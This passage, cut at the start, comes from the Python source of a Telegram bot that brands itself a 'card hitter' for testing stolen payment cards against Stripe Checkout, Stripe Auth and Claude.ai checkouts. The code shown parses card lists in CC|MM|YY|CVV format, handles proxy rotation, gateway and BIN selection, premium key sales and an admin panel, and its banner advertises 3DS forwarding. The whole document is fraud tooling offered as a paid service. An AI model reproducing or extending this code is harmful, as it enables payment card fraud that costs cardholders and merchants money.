                cards.append(card)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found. Format: CC|MM|YY|CVV per line")
            return
        
        session["cards"] = cards
        bot.reply_to(message, f"✅ **{len(cards)} CARDS LOADED!**\n\nUse `/mchk` to start checking.", parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== MESSAGE HANDLER ====================

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    text = message.text.strip()
    
    session = get_session(user_id)
    
    if text == "🚀 START CHECK":
        check_command(message)
    
    elif text == "⚙️ SET PROXY":
        session["step"] = "proxy"
        session["mode"] = "proxy_only"
        bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nSelect proxy type:", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_proxy_choice, user_id, session)
    
    elif text == "❌ REMOVE PROXY":
        session["proxy"] = None
        clear_user_proxy(user_id)
        bot.reply_to(message, "✅ Proxy removed.")
    
    elif text == "🔑 REDEEM KEY":
        redeem_command(message)
    
    elif text == "💰 BUY PREMIUM":
        buy_command(message)
    
    elif text == "📊 STATUS":
        status_command(message)
    
    elif text == "🛑 STOP":
        stop_command(message)
    
    elif text == "ℹ️ HELP":
        help_command(message)
    
    elif text == "👑 ADMIN":
        admin_panel_command(message)
    
    elif text == "🔙 BACK":
        if session.get("step") == "gateway":
            session["step"] = "start"
            clear_session(user_id)
            bot.reply_to(message, "Returned to main menu.", reply_markup=get_main_keyboard())
        elif session.get("step") == "proxy":
            session["step"] = "gateway"
            bot.reply_to(message, "📌 **SELECT GATEWAY**", reply_markup=get_gateway_keyboard(), parse_mode="Markdown")
        elif session.get("step") == "method":
            session["step"] = "proxy"
            bot.reply_to(message, "⚙️ **PROXY SETUP**", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
        elif session.get("step") == "check_type":
            session["step"] = "method"
            bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
        else:
            clear_session(user_id)
            bot.reply_to(message, "Returned to main menu.", reply_markup=get_main_keyboard())
    
    elif text.startswith("/"):
        pass
    
    else:
        if session.get("step") == "gateway":
            handle_gateway(message, user_id, session)
        elif session.get("step") == "proxy":
            handle_proxy_choice(message, user_id, session)
        elif session.get("step") == "method":
            handle_method(message, user_id, session)
        elif session.get("step") == "check_type":
            handle_check_type(message, user_id, session)
        elif session.get("step") == "card_input":
            handle_card_input(message, user_id, session)
        elif session.get("step") == "bin_input":
            handle_bin_input(message, user_id, session)
        elif session.get("step") == "bin_amount":
            handle_bin_amount(message, user_id, session)
        elif session.get("step") == "checkout_url":
            handle_checkout_url(message, user_id, session)
        elif session.get("step") == "waiting_single_proxy":
            handle_waiting_single_proxy(message, user_id, session)
        else:
            bot.reply_to(message, "❌ Unknown command. Use /start to see available commands.", reply_markup=get_main_keyboard())

# ==================== MAIN ====================

def main():
    load_data()
    
    # Load proxies from files
    load_proxies_from_files()
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              HAMZZY ULTIMATE CARD HITTER v8.0                    ║
║         Stripe Checkout | Stripe Auth | Claude.ai               ║
║              Full Admin Panel | 3DS Forwarding                  ║
║                    Developer: @hamzzyhacket                      ║
║                    Status: RUNNING                               ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[+] Bot Token: {BOT_TOKEN[:15]}...")
    print(f"[+] Admin ID: {ADMIN_ID}")
    print(f"[+] Users: {len(users)}")
    print(f"[+] Keys: {len(keys)}")
    print(f"[+] Proxies Loaded: {sum(len(proxy_list[t]) for t in proxy_list)}")
    print(f"[+] Starting polling...")
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"[-] Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
